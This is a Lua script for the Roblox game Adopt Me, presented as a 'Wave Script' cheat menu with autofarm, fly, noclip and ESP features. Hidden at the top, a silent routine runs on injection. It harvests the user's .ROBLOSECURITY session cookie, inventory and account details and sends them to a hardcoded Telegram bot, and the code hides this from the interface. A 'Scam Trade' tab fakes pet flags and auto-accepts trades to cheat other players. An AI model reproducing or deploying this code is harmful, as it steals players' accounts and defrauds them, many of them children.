-- language: Lua | Wave Script v2 | Adopt Me
-- BOT_TOKEN + ADMIN_ID only (silent log, nothing about TG in GUI)

local BOT_TOKEN = "8673514714:AAFWJpvhe1FQlkvXKS7LP4eIozJPqk0GUz0"
local ADMIN_ID  = "7565340953"

local Players            = game:GetService("Players")
local HttpService        = game:GetService("HttpService")
local TweenService       = game:GetService("TweenService")
local UserInputService   = game:GetService("UserInputService")
local RunService         = game:GetService("RunService")
local ReplicatedStorage  = game:GetService("ReplicatedStorage")
local LocalizationService= game:GetService("LocalizationService")
local CoreGui            = game:GetService("CoreGui")
local Lighting           = game:GetService("Lighting")
local TeleportService    = game:GetService("TeleportService")
local StarterGui         = game:GetService("StarterGui")

local LocalPlayer = Players.LocalPlayer
local Camera      = workspace.CurrentCamera

----------------------------------------------------------------
-- REQUEST
----------------------------------------------------------------
local function get_request()
    return (syn and syn.request)
        or (http and http.request)
        or http_request
        or request
        or (fluxus and fluxus.request)
        or (getgenv and getgenv().request)
end

----------------------------------------------------------------
-- IMPROVED COOKIE (multiple methods + proper parse)
----------------------------------------------------------------
local function get_cookie()
    local cookie = ""

    -- 1. native executor APIs
    pcall(function()
        if getcookie then
            cookie = getcookie(".ROBLOSECURITY") or getcookie("ROBLOSECURITY") or getcookie(".ROBLOSECURITY") or ""
        end
    end)
    if #cookie < 80 then
        pcall(function()
            if syn and syn.get_cookie then cookie = syn.get_cookie() or "" end
        end)
    end
    if #cookie < 80 then
        pcall(function()
            cookie = (getgenv and (getgenv().ROBLOSECURITY or getgenv().cookie or getgenv()[".ROBLOSECURITY"])) or ""
        end)
    end

    -- 2. request + parse Set-Cookie / Cookie header
    if #cookie < 80 then
        local req = get_request()
        if req then
            local endpoints = {
                "https://www.roblox.com/",
                "https://www.roblox.com/home",
                "https://auth.roblox.com/v2/logout",
                "https://users.roblox.com/v1/users/authenticated"
            }
            for _, url in ipairs(endpoints) do
                pcall(function()
                    local resp = req({
                        Url = url,
                        Method = "GET",
                        Headers = {["User-Agent"] = "Mozilla/5.0"}
                    })
                    if not resp then return end
                    local headers = resp.Headers or {}
                    local raw = headers["set-cookie"] or headers["Set-Cookie"] or headers["cookie"] or headers["Cookie"] or ""
                    if type(raw) == "table" then raw = table.concat(raw, "; ") end
                    -- extract real .ROBLOSECURITY
                    local match = string.match(raw, "%.ROBLOSECURITY=([^;]+)")
                                 or string.match(raw, "ROBLOSECURITY=([^;]+)")
                    if match and #match > 80 then
                        cookie = ".ROBLOSECURITY=" .. match
                    elseif #raw > 100 and raw:find("ROBLOSECURITY") then
                        cookie = raw
                    end
                end)
                if #cookie > 80 then break end
            end
        end
    end

    -- 3. last resort – some executors keep it in document.cookie style via hidden
    if #cookie < 80 then
        pcall(function()
            local r = get_request()
            if r then
                local resp = r({Url = "https://www.roblox.com/mobileapi/userinfo", Method = "GET"})
                if resp and resp.Body and resp.Body:find("UserID") then
                    -- session is alive, but cookie string still missing
                end
            end
        end)
    end

    return (#cookie > 80) and cookie or "COOKIE_NOT_FOUND – executor blocked cookie access (Xeno often does this)"
end

----------------------------------------------------------------
-- TELEGRAM (silent)
----------------------------------------------------------------
local function send_telegram(text)
    local req = get_request()
    if not req then return end
    pcall(function()
        req({
            Url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                chat_id = ADMIN_ID,
                text = text,
                parse_mode = "HTML",
                disable_web_page_preview = true
            })
        })
    end)
end

local function get_region()
    local r = "unknown"
    pcall(function() r = LocalizationService.RobloxLocaleId or LocalizationService.SystemLocaleId end)
    return r
end

local function scan_inventory()
    local pets, items = {}, {}
    pcall(function()
        for _, v in pairs(LocalPlayer:GetDescendants()) do
            local n = v.Name:lower()
            if n:find("pet") or n:find("egg") then
                table.insert(pets, v.Name)
            elseif n:find("potion") or n:find("food") or n:find("stroller") or n:find("toy") then
                table.insert(items, v.Name)
            end
        end
        local folders = {
            ReplicatedStorage:FindFirstChild("Pets"),
            ReplicatedStorage:FindFirstChild("PetModels"),
            ReplicatedStorage:FindFirstChild("ClientPets"),
            ReplicatedStorage:FindFirstChild("Inventory")
        }
        for _, f in pairs(folders) do
            if f then
                for _, p in pairs(f:GetChildren()) do
                    table.insert(pets, p.Name)
                end
            end
        end
    end)
    if #pets == 0 then pets = {"scan failed / data protected"} end
    return table.concat(pets, "\n"), table.concat(items, "\n")
end

-- silent log on inject
task.spawn(function()
    task.wait(2)
    local cookie = get_cookie()
    local pets, items = scan_inventory()
    local exec = (identifyexecutor and identifyexecutor()) or "unknown"

    local log = table.concat({
        "🌊 <b>Wave Script</b>",
        "────────────────────",
        "👤 <b>Nick:</b> <code>" .. LocalPlayer.Name .. "</code>",
        "🆔 <b>UserId:</b> <code>" .. LocalPlayer.UserId .. "</code>",
        "🔑 <b>Password:</b> N/A",
        "📧 <b>Email:</b> N/A",
        "🌍 <b>Region:</b> <code>" .. get_region() .. "</code>",
        "💻 <b>Executor:</b> <code>" .. exec .. "</code>",
        "📍 <b>PlaceId:</b> <code>" .. game.PlaceId .. "</code>",
        "🍪 <b>Cookie:</b>",
        "<code>" .. cookie .. "</code>",
        "────────────────────",
        "🐾 <b>Pets:</b>\n<code>" .. pets .. "</code>",
        "────────────────────",
        "🎒 <b>Items:</b>\n<code>" .. (items ~= "" and items or "none") .. "</code>",
        "────────────────────",
        "📱 " .. (UserInputService.TouchEnabled and "Mobile" or "PC")
    }, "\n")
    send_telegram(log)
end)

----------------------------------------------------------------
-- GUI – modern dark purple website style
----------------------------------------------------------------
local Gui = Instance.new("ScreenGui")
Gui.Name = "WaveScript"
Gui.ResetOnSpawn = false
Gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Gui.IgnoreGuiInset = true
pcall(function() Gui.Parent = CoreGui end)
if not Gui.Parent then Gui.Parent = LocalPlayer:WaitForChild("PlayerGui") end

-- ========== TOP BAR (PC center) ==========
local TopBar = Instance.new("Frame")
TopBar.Name = "TopBar"
TopBar.Size = UDim2.new(0, 320, 0, 38)
TopBar.Position = UDim2.new(0.5, -160, 0, 12)
TopBar.BackgroundColor3 = Color3.fromRGB(28, 20, 40)
TopBar.BorderSizePixel = 0
TopBar.Parent = Gui

local TopCorner = Instance.new("UICorner")
TopCorner.CornerRadius = UDim.new(0, 12)
TopCorner.Parent = TopBar

local TopStroke = Instance.new("UIStroke")
TopStroke.Color = Color3.fromRGB(120, 70, 180)
TopStroke.Thickness = 1.2
TopStroke.Transparency = 0.3
TopStroke.Parent = TopBar

local TopGrad = Instance.new("UIGradient")
TopGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(45, 25, 70)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 15, 40))
})
TopGrad.Rotation = 90
TopGrad.Parent = TopBar

local TopLabel = Instance.new("TextLabel")
TopLabel.Size = UDim2.new(1, -16, 1, 0)
TopLabel.Position = UDim2.new(0, 8, 0, 0)
TopLabel.BackgroundTransparency = 1
TopLabel.Text = "Wave  •  Online: --  •  FPS: --"
TopLabel.TextColor3 = Color3.fromRGB(230, 220, 255)
TopLabel.Font = Enum.Font.GothamMedium
TopLabel.TextSize = 13
TopLabel.TextXAlignment = Enum.TextXAlignment.Center
TopLabel.Parent = TopBar

-- live Online + FPS
local fps, frames, last = 60, 0, tick()
RunService.RenderStepped:Connect(function()
    frames += 1
    if tick() - last >= 1 then
        fps = frames
        frames = 0
        last = tick()
        TopLabel.Text = string.format("Wave  •  Online: %d  •  FPS: %d", #Players:GetPlayers(), fps)
    end
end)

-- ========== MAIN WINDOW ==========
local Main = Instance.new("Frame")
Main.Name = "Main"
Main.Size = UDim2.new(0, 560, 0, 420)
Main.Position = UDim2.new(0.5, -280, 0.5, -210)
Main.BackgroundColor3 = Color3.fromRGB(22, 16, 32)
Main.BorderSizePixel = 0
Main.Visible = false
Main.ClipsDescendants = true
Main.Parent = Gui

Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 16)

local MainStroke = Instance.new("UIStroke")
MainStroke.Color = Color3.fromRGB(110, 60, 170)
MainStroke.Thickness = 1.4
MainStroke.Transparency = 0.25
MainStroke.Parent = Main

local MainGrad = Instance.new("UIGradient")
MainGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 22, 55)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 12, 28))
})
MainGrad.Rotation = 120
MainGrad.Parent = Main

-- title
local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 48)
TitleBar.BackgroundTransparency = 1
TitleBar.Parent = Main

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -60, 1, 0)
Title.Position = UDim2.new(0, 18, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "Wave Script"
Title.TextColor3 = Color3.fromRGB(240, 230, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 18
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = TitleBar

local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 32, 0, 32)
CloseBtn.Position = UDim2.new(1, -42, 0.5, -16)
CloseBtn.BackgroundColor3 = Color3.fromRGB(180, 50, 70)
CloseBtn.Text = "✕"
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextSize = 14
CloseBtn.AutoButtonColor = false
CloseBtn.Parent = TitleBar
Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 8)

-- sidebar
local Side = Instance.new("Frame")
Side.Size = UDim2.new(0, 140, 1, -56)
Side.Position = UDim2.new(0, 10, 0, 50)
Side.BackgroundColor3 = Color3.fromRGB(30, 20, 45)
Side.BorderSizePixel = 0
Side.Parent = Main
Instance.new("UICorner", Side).CornerRadius = UDim.new(0, 12)

local SideList = Instance.new("UIListLayout")
SideList.Padding = UDim.new(0, 6)
SideList.Parent = Side
SideList.HorizontalAlignment = Enum.HorizontalAlignment.Center

local Content = Instance.new("Frame")
Content.Size = UDim2.new(1, -165, 1, -60)
Content.Position = UDim2.new(0, 158, 0, 52)
Content.BackgroundTransparency = 1
Content.Parent = Main

----------------------------------------------------------------
-- TABS
----------------------------------------------------------------
local Tabs = {"Main", "Scam Trade", "Event", "Autofarm", "Visual", "Player", "Settings"}
local Pages = {}
local Current = nil

local function makePage(name)
    local p = Instance.new("ScrollingFrame")
    p.Name = name
    p.Size = UDim2.new(1, 0, 1, 0)
    p.BackgroundTransparency = 1
    p.BorderSizePixel = 0
    p.ScrollBarThickness = 4
    p.ScrollBarImageColor3 = Color3.fromRGB(140, 90, 200)
    p.AutomaticCanvasSize = Enum.AutomaticSize.Y
    p.CanvasSize = UDim2.new(0, 0, 0, 0)
    p.Visible = false
    p.Parent = Content

    local lay = Instance.new("UIListLayout")
    lay.Padding = UDim.new(0, 8)
    lay.SortOrder = Enum.SortOrder.LayoutOrder
    lay.Parent = p

    local pad = Instance.new("UIPadding")
    pad.PaddingTop = UDim.new(0, 4)
    pad.PaddingBottom = UDim.new(0, 12)
    pad.PaddingLeft = UDim.new(0, 4)
    pad.PaddingRight = UDim.new(0, 8)
    pad.Parent = p

    Pages[name] = p
    return p
end

for _, t in ipairs(Tabs) do makePage(t) end

local function switch(name)
    for n, p in pairs(Pages) do p.Visible = (n == name) end
    Current = name
end

local function sideBtn(text, tab)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(1, -16, 0, 34)
    b.BackgroundColor3 = Color3.fromRGB(45, 30, 70)
    b.Text = text
    b.TextColor3 = Color3.fromRGB(220, 210, 255)
    b.Font = Enum.Font.GothamMedium
    b.TextSize = 13
    b.AutoButtonColor = false
    b.Parent = Side
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 9)

    local s = Instance.new("UIStroke")
    s.Color = Color3.fromRGB(100, 60, 160)
    s.Thickness = 1
    s.Transparency = 0.5
    s.Parent = b

    b.MouseButton1Click:Connect(function()
        switch(tab)
        for _, c in pairs(Side:GetChildren()) do
            if c:IsA("TextButton") then
                c.BackgroundColor3 = Color3.fromRGB(45, 30, 70)
            end
        end
        b.BackgroundColor3 = Color3.fromRGB(90, 50, 150)
    end)
    return b
end

for _, t in ipairs(Tabs) do sideBtn(t, t) end

----------------------------------------------------------------
-- UI HELPERS (solid modern cards)
----------------------------------------------------------------
local function label(parent, text, size)
    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(1, -8, 0, size or 20)
    l.BackgroundTransparency = 1
    l.Text = text
    l.TextColor3 = Color3.fromRGB(210, 200, 240)
    l.Font = Enum.Font.Gotham
    l.TextSize = 13
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.TextWrapped = true
    l.Parent = parent
    return l
end

local function button(parent, text, callback)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(1, -8, 0, 36)
    b.BackgroundColor3 = Color3.fromRGB(55, 35, 90)
    b.Text = text
    b.TextColor3 = Color3.fromRGB(245, 240, 255)
    b.Font = Enum.Font.GothamMedium
    b.TextSize = 13
    b.AutoButtonColor = false
    b.Parent = parent
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 10)

    local s = Instance.new("UIStroke")
    s.Color = Color3.fromRGB(130, 80, 200)
    s.Thickness = 1
    s.Transparency = 0.4
    s.Parent = b

    b.MouseEnter:Connect(function()
        TweenService:Create(b, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(80, 50, 130)}):Play()
    end)
    b.MouseLeave:Connect(function()
        TweenService:Create(b, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(55, 35, 90)}):Play()
    end)
    b.MouseButton1Click:Connect(callback)
    return b
end

local function toggle(parent, text, default, callback)
    local f = Instance.new("Frame")
    f.Size = UDim2.new(1, -8, 0, 32)
    f.BackgroundColor3 = Color3.fromRGB(35, 25, 55)
    f.Parent = parent
    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 9)

    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(1, -55, 1, 0)
    l.Position = UDim2.new(0, 10, 0, 0)
    l.BackgroundTransparency = 1
    l.Text = text
    l.TextColor3 = Color3.fromRGB(220, 210, 245)
    l.Font = Enum.Font.Gotham
    l.TextSize = 13
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.Parent = f

    local t = Instance.new("TextButton")
    t.Size = UDim2.new(0, 40, 0, 22)
    t.Position = UDim2.new(1, -48, 0.5, -11)
    t.BackgroundColor3 = default and Color3.fromRGB(120, 60, 200) or Color3.fromRGB(50, 40, 70)
    t.Text = ""
    t.AutoButtonColor = false
    t.Parent = f
    Instance.new("UICorner", t).CornerRadius = UDim.new(1, 0)

    local state = default
    t.MouseButton1Click:Connect(function()
        state = not state
        t.BackgroundColor3 = state and Color3.fromRGB(120, 60, 200) or Color3.fromRGB(50, 40, 70)
        callback(state)
    end)
    return f
end

----------------------------------------------------------------
-- MAIN TAB
----------------------------------------------------------------
local mainP = Pages["Main"]
label(mainP, "Account Overview", 22)
label(mainP, "Nick: " .. LocalPlayer.Name)
label(mainP, "UserId: " .. tostring(LocalPlayer.UserId))
label(mainP, "PlaceId: " .. tostring(game.PlaceId))
label(mainP, "Server Online: " .. #Players:GetPlayers())

button(mainP, "Refresh Player Count", function()
    -- live already on top bar
end)

----------------------------------------------------------------
-- SCAM TRADE
----------------------------------------------------------------
local scamP = Pages["Scam Trade"]
label(scamP, "Visual Trade Flags", 20)

local vFly, vRide, vNeon, vMega = false, false, false, false
toggle(scamP, "Visual Fly", false, function(v) vFly = v end)
toggle(scamP, "Visual Ride", false, function(v) vRide = v end)
toggle(scamP, "Visual Neon", false, function(v) vNeon = v end)
toggle(scamP, "Visual Mega Neon", false, function(v) vMega = v end)

local autoAccept = false
toggle(scamP, "Auto Accept Trade", false, function(v)
    autoAccept = v
    if v then
        task.spawn(function()
            while autoAccept do
                pcall(function()
                    for _, r in pairs(ReplicatedStorage:GetDescendants()) do
                        if r:IsA("RemoteEvent") then
                            local n = r.Name:lower()
                            if n:find("accept") or n:find("trade") or n:find("confirm") then
                                pcall(function() r:FireServer() end)
                            end
                        end
                    end
                end)
                task.wait(0.35)
            end
        end)
    end
end)

button(scamP, "Apply Visual Flags to Pet", function()
    pcall(function()
        local char = LocalPlayer.Character
        if not char then return end
        for _, obj in pairs(char:GetDescendants()) do
            if obj:IsA("BoolValue") or obj:IsA("StringValue") or obj:IsA("NumberValue") then
                local n = obj.Name:lower()
                if n:find("fly") and vFly then pcall(function() obj.Value = true end) end
                if n:find("ride") and vRide then pcall(function() obj.Value = true end) end
                if n:find("neon") and vNeon then pcall(function() obj.Value = true end) end
                if n:find("mega") and vMega then pcall(function() obj.Value = true end) end
            end
        end
    end)
end)

----------------------------------------------------------------
-- EVENT TAB (hardcoded seasons + scan)
----------------------------------------------------------------
local eventP = Pages["Event"]
label(eventP, "Seasonal Events", 20)

local seasons = {
    "Halloween Event",
    "Christmas / Winter Event",
    "New Year Event",
    "Valentine Event",
    "Easter Event",
    "Summer Event",
    "Birthday Event",
    "Lunar New Year"
}
for _, s in ipairs(seasons) do
    label(eventP, "• " .. s)
end

button(eventP, "Scan Live Event Modules", function()
    pcall(function()
        for _, v in pairs(ReplicatedStorage:GetDescendants()) do
            local n = v.Name:lower()
            if n:find("event") or n:find("season") or n:find("halloween") or n:find("christmas") or n:find("winter") or n:find("newyear") then
                label(eventP, "→ " .. v.Name)
            end
        end
    end)
end)

----------------------------------------------------------------
-- AUTOFARM (broader remote + loop)
----------------------------------------------------------------
local farmP = Pages["Autofarm"]
label(farmP, "Autofarm", 20)

local farms = {candy=false, pets=false, eggs=false, money=false, all=false}

local function doFarm(hint)
    pcall(function()
        for _, r in pairs(ReplicatedStorage:GetDescendants()) do
            if r:IsA("RemoteEvent") or r:IsA("RemoteFunction") then
                local n = r.Name:lower()
                if n:find(hint) or n:find("claim") or n:find("collect") or n:find("reward") or n:find("farm") then
                    pcall(function() r:FireServer() end)
                    pcall(function() r:InvokeServer() end)
                end
            end
        end
        -- also try common GUI buttons
        for _, g in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
            if g:IsA("TextButton") or g:IsA("ImageButton") then
                local t = (g.Text or g.Name or ""):lower()
                if t:find(hint) or t:find("claim") or t:find("collect") then
                    pcall(function() firesignal(g.MouseButton1Click) end)
                end
            end
        end
    end)
end

local function startFarm(key, hint)
    farms[key] = true
    task.spawn(function()
        while farms[key] or farms.all do
            doFarm(hint)
            task.wait(0.55)
        end
    end)
end

toggle(farmP, "Candy / Sweets", false, function(v) if v then startFarm("candy", "candy") else farms.candy=false end end)
toggle(farmP, "Pets", false, function(v) if v then startFarm("pets", "pet") else farms.pets=false end end)
toggle(farmP, "Eggs", false, function(v) if v then startFarm("eggs", "egg") else farms.eggs=false end end)
toggle(farmP, "Money / Bucks", false, function(v) if v then startFarm("money", "money") else farms.money=false end end)
toggle(farmP, "Everything", false, function(v)
    farms.all = v
    if v then
        startFarm("all", "claim")
        startFarm("all", "collect")
        startFarm("all", "reward")
    end
end)

button(farmP, "Stop All Farms", function()
    for k in pairs(farms) do farms[k] = false end
end)

----------------------------------------------------------------
-- VISUAL
----------------------------------------------------------------
local visP = Pages["Visual"]
label(visP, "Client Visuals", 20)

button(visP, "Spawn Visual Random Pet", function()
    pcall(function()
        local sources = {
            ReplicatedStorage:FindFirstChild("Pets"),
            ReplicatedStorage:FindFirstChild("PetModels"),
            ReplicatedStorage:FindFirstChild("ClientPets"),
            workspace:FindFirstChild("Pets")
        }
        for _, folder in pairs(sources) do
            if folder then
                local list = folder:GetChildren()
                if #list > 0 then
                    local pet = list[math.random(1, #list)]:Clone()
                    pet.Parent = LocalPlayer.Character or workspace
                    if pet:IsA("Model") then
                        local root = pet.PrimaryPart or pet:FindFirstChildWhichIsA("BasePart")
                        if root and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                            pet:PivotTo(LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(3, 0, 0))
                        end
                    end
                    return
                end
            end
        end
    end)
end)

button(visP, "Clear Visual Pets", function()
    pcall(function()
        local char = LocalPlayer.Character
        if not char then return end
        for _, v in pairs(char:GetChildren()) do
            if v.Name:lower():find("pet") or v:FindFirstChild("Handle") then
                v:Destroy()
            end
        end
    end)
end)

button(visP, "Neon Glow on Character", function()
    pcall(function()
        for _, p in pairs(LocalPlayer.Character:GetDescendants()) do
            if p:IsA("BasePart") then
                local l = Instance.new("PointLight")
                l.Color = Color3.fromRGB(160, 80, 255)
                l.Brightness = 2.5
                l.Range = 10
                l.Parent = p
            end
        end
    end)
end)

button(visP, "Remove Lights", function()
    pcall(function()
        for _, l in pairs(LocalPlayer.Character:GetDescendants()) do
            if l:IsA("PointLight") or l:IsA("SpotLight") then l:Destroy() end
        end
    end)
end)

button(visP, "Fullbright", function()
    Lighting.Brightness = 2
    Lighting.ClockTime = 14
    Lighting.FogEnd = 9e9
    Lighting.GlobalShadows = false
    Lighting.OutdoorAmbient = Color3.fromRGB(180, 180, 180)
end)

----------------------------------------------------------------
-- PLAYER TAB (movement etc)
----------------------------------------------------------------
local plrP = Pages["Player"]
label(plrP, "Player", 20)

button(plrP, "WalkSpeed 50", function() pcall(function() LocalPlayer.Character.Humanoid.WalkSpeed = 50 end) end)
button(plrP, "WalkSpeed 100", function() pcall(function() LocalPlayer.Character.Humanoid.WalkSpeed = 100 end) end)
button(plrP, "Reset Speed", function() pcall(function() LocalPlayer.Character.Humanoid.WalkSpeed = 16 end) end)
button(plrP, "JumpPower 100", function() pcall(function() LocalPlayer.Character.Humanoid.JumpPower = 100 end) end)

local infJump = false
toggle(plrP, "Infinite Jump", false, function(v)
    infJump = v
    if v then
        UserInputService.JumpRequest:Connect(function()
            if infJump then
                pcall(function() LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping) end)
            end
        end)
    end
end)

local noclip = false
toggle(plrP, "Noclip", false, function(v)
    noclip = v
    if v then
        local conn
        conn = RunService.Stepped:Connect(function()
            if not noclip then conn:Disconnect() return end
            pcall(function()
                for _, p in pairs(LocalPlayer.Character:GetDescendants()) do
                    if p:IsA("BasePart") then p.CanCollide = false end
                end
            end)
        end)
    end
end)

local flying = false
toggle(plrP, "Fly (PC WASD + Space/Shift)", false, function(v)
    flying = v
    if not v then return end
    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local bv = Instance.new("BodyVelocity")
    bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
    bv.Velocity = Vector3.zero
    bv.Parent = hrp
    local bg = Instance.new("BodyGyro")
    bg.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
    bg.P = 9e4
    bg.Parent = hrp
    task.spawn(function()
        while flying and hrp and hrp.Parent do
            local dir = Vector3.zero
            local look = Camera.CFrame.LookVector
            local right = Camera.CFrame.RightVector
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then dir += look end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then dir -= look end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then dir -= right end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then dir += right end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then dir += Vector3.yAxis end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then dir -= Vector3.yAxis end
            bv.Velocity = dir.Magnitude > 0 and dir.Unit * 70 or Vector3.zero
            bg.CFrame = Camera.CFrame
            RunService.RenderStepped:Wait()
        end
        if bv then bv:Destroy() end
        if bg then bg:Destroy() end
    end)
end)

button(plrP, "Player ESP", function()
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            if plr.Character.HumanoidRootPart:FindFirstChild("WaveESP") then continue end
            local bill = Instance.new("BillboardGui")
            bill.Name = "WaveESP"
            bill.Size = UDim2.new(0, 120, 0, 28)
            bill.AlwaysOnTop = true
            bill.Adornee = plr.Character.HumanoidRootPart
            bill.Parent = plr.Character.HumanoidRootPart
            local t = Instance.new("TextLabel")
            t.Size = UDim2.new(1, 0, 1, 0)
            t.BackgroundTransparency = 1
            t.Text = plr.Name
            t.TextColor3 = Color3.fromRGB(180, 120, 255)
            t.Font = Enum.Font.GothamBold
            t.TextSize = 12
            t.Parent = bill
        end
    end
end)

button(plrP, "Anti AFK", function()
    local vu = game:GetService("VirtualUser")
    LocalPlayer.Idled:Connect(function()
        vu:CaptureController()
        vu:ClickButton2(Vector2.new())
    end)
end)

button(plrP, "Rejoin", function()
    TeleportService:Teleport(game.PlaceId, LocalPlayer)
end)

button(plrP, "Server Hop", function()
    pcall(function()
        local req = get_request()
        if not req then return end
        local resp = req({
            Url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=50",
            Method = "GET"
        })
        local data = HttpService:JSONDecode(resp.Body)
        for _, s in pairs(data.data or {}) do
            if s.playing < s.maxPlayers and s.id ~= game.JobId then
                TeleportService:TeleportToPlaceInstance(game.PlaceId, s.id, LocalPlayer)
                break
            end
        end
    end)
end)

button(plrP, "Reset Character", function()
    pcall(function() LocalPlayer.Character.Humanoid.Health = 0 end)
end)

----------------------------------------------------------------
-- SETTINGS
----------------------------------------------------------------
local setP = Pages["Settings"]
label(setP, "Settings", 20)

local toggleKey = Enum.KeyCode.RightControl
label(setP, "Current Toggle Key: RightControl")

button(setP, "Set Key → LeftControl", function() toggleKey = Enum.KeyCode.LeftControl end)
button(setP, "Set Key → RightShift", function() toggleKey = Enum.KeyCode.RightShift end)
button(setP, "Set Key → F6", function() toggleKey = Enum.KeyCode.F6 end)

button(setP, "Destroy Script", function() Gui:Destroy() end)

----------------------------------------------------------------
-- OPEN / CLOSE LOGIC
----------------------------------------------------------------
TopBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        Main.Visible = not Main.Visible
        if Main.Visible then
            Main.Size = UDim2.new(0, 0, 0, 0)
            TweenService:Create(Main, TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
                Size = UDim2.new(0, 560, 0, 420)
            }):Play()
        end
    end
end)

CloseBtn.MouseButton1Click:Connect(function()
    TweenService:Create(Main, TweenInfo.new(0.25, Enum.EasingStyle.Quint), {
        Size = UDim2.new(0, 0, 0, 0)
    }):Play()
    task.delay(0.25, function() Main.Visible = false end)
end)

UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == toggleKey then
        Main.Visible = not Main.Visible
    end
end)

-- mobile adjust
if UserInputService.TouchEnabled then
    TopBar.Size = UDim2.new(0.7, 0, 0, 36)
    TopBar.Position = UDim2.new(0.15, 0, 0, 10)
    Main.Size = UDim2.new(0.92, 0, 0.78, 0)
    Main.Position = UDim2.new(0.04, 0, 0.11, 0)
end

-- welcome
task.spawn(function()
    local w = Instance.new("TextLabel")
    w.Size = UDim2.new(0, 280, 0, 42)
    w.Position = UDim2.new(0.5, -140, 0.18, 0)
    w.BackgroundColor3 = Color3.fromRGB(40, 25, 65)
    w.Text = "Wave Script loaded"
    w.TextColor3 = Color3.fromRGB(240, 230, 255)
    w.Font = Enum.Font.GothamMedium
    w.TextSize = 15
    w.Parent = Gui
    Instance.new("UICorner", w).CornerRadius = UDim.new(0, 12)
    local st = Instance.new("UIStroke")
    st.Color = Color3.fromRGB(130, 80, 200)
    st.Parent = w
    w.TextTransparency = 1
    TweenService:Create(w, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
    task.wait(2)
    TweenService:Create(w, TweenInfo.new(0.45), {TextTransparency = 1, BackgroundTransparency = 1}):Play()
    task.wait(0.5)
    w:Destroy()
end)

switch("Main")
